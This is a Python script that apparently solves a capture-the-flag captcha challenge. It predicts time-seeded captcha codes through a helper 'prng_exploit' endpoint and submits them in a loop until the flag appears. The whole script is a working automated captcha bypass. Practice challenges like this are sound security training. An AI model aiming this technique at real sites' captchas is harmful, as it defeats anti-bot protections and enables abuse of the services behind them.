import requests
import re


cookies = dict(PHPSESSID="in9kr3h88pabkfceshom3vppf9")
time_reg = r"<img src='\/simple-php-captcha\/simple-php-captcha\.php\?_CAPTCHA&amp;t=([0-9\.+]+)'><br>"
result_reg = r"'([0-9A-Za-z]+)'"
success_reg = r"You have ([0-9]+) success so far"

while True:
    #Get the captcha and retrieve the time
    r = requests.get("http://challenge.montrehack.ca/captcha3.php", cookies=cookies)
    content = r.text
    
    timestamp = content[content.index("t=")+2:content.index("'><br>")]
    #timestamp = re.search(time_reg, r.text).group(1)
    
    #Run the same code with the time as seed and get the code
    r = requests.get("http://challenge.montrehack.ca/b65ajfuy_prng_exploit.php?time=" + timestamp)
    
    #Submit the captcha
    r = requests.post("http://challenge.montrehack.ca/captcha3.php", data = {"captcha":r.text}, cookies=cookies)
    
    if "success" in r.text:
        successes = int(re.search(success_reg, r.text).group(1))

        if successes % 500:
            print(str(successes) + " successes so far")

    if "The flag is" in r.text:
        print(r.text)
        break
